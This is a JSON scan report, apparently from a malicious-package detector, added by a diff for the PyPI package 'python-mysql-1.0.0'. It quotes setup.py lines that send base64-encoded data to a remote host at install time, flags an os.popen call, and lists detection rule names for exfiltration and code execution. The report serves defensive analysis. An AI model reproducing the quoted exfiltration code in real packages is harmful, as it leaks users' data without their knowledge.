@@ -1,0 +1,35 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "dll-hijacking": {},
+        "download-executable": {},
+        "shady-links": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:26",
+                "code": "        request.urlopen(r'http://mysql.openvc.org/mysql.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "setup.py:28",
+                "code": "        urllib.urlopen(r'http://mysql.openvc.org/mysql.php','vid='+base64.encodestring(vid))\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "obfuscation": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": [
+            {
+                "location": "setup.py:20",
+                "code": "        loc_lang = os.popen(\"echo $LANG\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/python-mysql-1.0.0"
+}
